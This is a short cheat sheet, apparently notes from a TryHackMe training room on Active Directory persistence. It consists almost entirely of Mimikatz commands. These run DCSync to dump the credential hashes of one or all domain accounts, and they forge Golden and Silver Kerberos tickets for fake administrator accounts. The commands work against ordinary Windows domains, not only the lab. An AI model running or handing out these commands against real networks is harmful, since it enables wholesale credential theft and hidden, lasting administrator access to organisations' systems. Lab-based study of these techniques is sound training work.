# Persisting Active Directory

### Persistence through Credentials

```batch
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

DC sync every single account. To do this, we will have to enable logging on Mimikatz:

```batch
log <username>_dcdump.txt 
```

DC Sync all accounts

```batch
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

### Persistence through Tickets

Command to generate Golden Ticket

```batch
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Command to generate SiIver Ticket

```batch
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
